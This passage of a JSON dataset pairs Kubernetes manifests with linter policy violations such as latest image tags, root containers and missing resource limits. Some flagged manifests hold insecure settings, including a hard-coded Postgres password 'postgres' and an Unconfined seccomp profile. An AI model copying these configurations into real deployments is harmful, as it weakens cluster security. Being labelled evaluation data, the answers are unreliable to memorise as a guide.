    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iis3\n  namespace: default\n  labels:\n    name: iis3\n    os: windows\nspec:\n  containers:\n  - image: microsoft/iis:latest\n    name: iis3\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"iis3\" has cpu request 0"
  },
  {
    "id": "9933",
    "manifest_path": "data/manifests/the_stack_sample/sample_3823.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iis3\n  namespace: default\n  labels:\n    name: iis3\n    os: windows\nspec:\n  containers:\n  - image: microsoft/iis:latest\n    name: iis3\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"iis3\" has memory limit 0"
  },
  {
    "id": "9934",
    "manifest_path": "data/manifests/the_stack_sample/sample_3824.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bot-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: bot\n  template:\n    metadata:\n      labels:\n        component: bot\n    spec:\n      containers:\n      - name: bot\n        image: reactivetradercloud/bot:4765\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '8000'\n        - name: BOT_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-name\n        - name: BOT_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-address\n        - name: PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: syphony-secrets\n              key: rsa-privatekey\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bot\" does not have a read-only root file system"
  },
  {
    "id": "9935",
    "manifest_path": "data/manifests/the_stack_sample/sample_3824.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bot-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: bot\n  template:\n    metadata:\n      labels:\n        component: bot\n    spec:\n      containers:\n      - name: bot\n        image: reactivetradercloud/bot:4765\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '8000'\n        - name: BOT_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-name\n        - name: BOT_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-address\n        - name: PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: syphony-secrets\n              key: rsa-privatekey\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bot\" is not set to runAsNonRoot"
  },
  {
    "id": "9936",
    "manifest_path": "data/manifests/the_stack_sample/sample_3824.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bot-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: bot\n  template:\n    metadata:\n      labels:\n        component: bot\n    spec:\n      containers:\n      - name: bot\n        image: reactivetradercloud/bot:4765\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '8000'\n        - name: BOT_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-name\n        - name: BOT_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-address\n        - name: PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: syphony-secrets\n              key: rsa-privatekey\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bot\" has cpu request 0"
  },
  {
    "id": "9937",
    "manifest_path": "data/manifests/the_stack_sample/sample_3824.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bot-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: bot\n  template:\n    metadata:\n      labels:\n        component: bot\n    spec:\n      containers:\n      - name: bot\n        image: reactivetradercloud/bot:4765\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '8000'\n        - name: BOT_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-name\n        - name: BOT_ADDRESS\n          valueFrom:\n            configMapKeyRef:\n              name: bot-config\n              key: bot-address\n        - name: PRIVATE_KEY\n          valueFrom:\n            secretKeyRef:\n              name: syphony-secrets\n              key: rsa-privatekey\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bot\" has memory limit 0"
  },
  {
    "id": "9938",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"keda-operator\" is using an invalid container image, \"docker.io/kedacore/keda:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9939",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"keda-operator\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9940",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"keda-operator\" does not have a read-only root file system"
  },
  {
    "id": "9941",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"keda-operator\" not found"
  },
  {
    "id": "9942",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"keda-operator\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9943",
    "manifest_path": "data/manifests/the_stack_sample/sample_3828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-operator\n  namespace: keda\n  labels:\n    app: keda-operator\n    app.kubernetes.io/name: keda-operator\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/component: operator\n    app.kubernetes.io/part-of: keda-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: keda-operator\n  template:\n    metadata:\n      labels:\n        app: keda-operator\n        name: keda-operator\n      name: keda-operator\n    spec:\n      serviceAccountName: keda-operator\n      containers:\n      - name: keda-operator\n        image: docker.io/kedacore/keda:latest\n        command:\n        - /keda\n        args:\n        - --enable-leader-election\n        - --zap-log-level=info\n        - --zap-encoder=console\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"keda-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9944",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9945",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9946",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "9947",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "9948",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "9949",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "9950",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "9951",
    "manifest_path": "data/manifests/the_stack_sample/sample_3829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp_baseline1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seccompProfile:\n        type: Unconfined\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "9952",
    "manifest_path": "data/manifests/the_stack_sample/sample_3831.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    foo.com/duname: dkrcompsvr\n    foo.com/duversion: 0.17.0-20190924.1569321127401\n    foo.com/version: 0.17.0\n  labels:\n    app.kubernetes.io/name: compsrv\n    helm.sh/chart: compsrv-0.17.0\n  name: compsrv\nspec:\n  ports:\n  - name: launcher\n    port: 8087\n    targetPort: launcher\n  - name: compute1\n    port: 8088\n    targetPort: compute1\n  - name: compute2\n    port: 8089\n    targetPort: compute2\n  - name: compute3\n    port: 8090\n    targetPort: compute3\n  - name: compute4\n    port: 8091\n    targetPort: compute4\n  - name: compute5\n    port: 8092\n    targetPort: compute5\n  - name: compute6\n    port: 8093\n    targetPort: compute6\n  - name: compute7\n    port: 8094\n    targetPort: compute7\n  - name: compute8\n    port: 8095\n    targetPort: compute8\n  - name: compute9\n    port: 8096\n    targetPort: compute9\n  - name: compute10\n    port: 8097\n    targetPort: compute10\n  selector:\n    app.kubernetes.io/name: compsrv\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:compsrv])"
  },
  {
    "id": "9953",
    "manifest_path": "data/manifests/the_stack_sample/sample_3833.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20190620-191059517\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "9954",
    "manifest_path": "data/manifests/the_stack_sample/sample_3833.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20190620-191059517\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "9955",
    "manifest_path": "data/manifests/the_stack_sample/sample_3833.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20190620-191059517\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "9956",
    "manifest_path": "data/manifests/the_stack_sample/sample_3833.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20190620-191059517\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "9957",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (jenkins), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "9958",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9959",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "9960",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jenkins\" not found"
  },
  {
    "id": "9961",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "9962",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "9963",
    "manifest_path": "data/manifests/the_stack_sample/sample_3834.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ckad-pod\n  labels:\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: jenkins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "9964",
    "manifest_path": "data/manifests/the_stack_sample/sample_3836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: vote\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - image: postgres:latest\n        name: postgres\n        env:\n        - name: POSTGRES_USER\n          value: postgres\n        - name: POSTGRES_PASSWORD\n          value: postgres\n        ports:\n        - containerPort: 5432\n          name: postgres\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: db-data\n      volumes:\n      - name: db-data\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"postgres\" is using an invalid container image, \"postgres:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9965",
    "manifest_path": "data/manifests/the_stack_sample/sample_3836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: vote\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - image: postgres:latest\n        name: postgres\n        env:\n        - name: POSTGRES_USER\n          value: postgres\n        - name: POSTGRES_PASSWORD\n          value: postgres\n        ports:\n        - containerPort: 5432\n          name: postgres\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: db-data\n      volumes:\n      - name: db-data\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "9966",
    "manifest_path": "data/manifests/the_stack_sample/sample_3836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: vote\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - image: postgres:latest\n        name: postgres\n        env:\n        - name: POSTGRES_USER\n          value: postgres\n        - name: POSTGRES_PASSWORD\n          value: postgres\n        ports:\n        - containerPort: 5432\n          name: postgres\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: db-data\n      volumes:\n      - name: db-data\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "9967",
    "manifest_path": "data/manifests/the_stack_sample/sample_3836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: vote\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - image: postgres:latest\n        name: postgres\n        env:\n        - name: POSTGRES_USER\n          value: postgres\n        - name: POSTGRES_PASSWORD\n          value: postgres\n        ports:\n        - containerPort: 5432\n          name: postgres\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: db-data\n      volumes:\n      - name: db-data\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "9968",
    "manifest_path": "data/manifests/the_stack_sample/sample_3836.yaml",
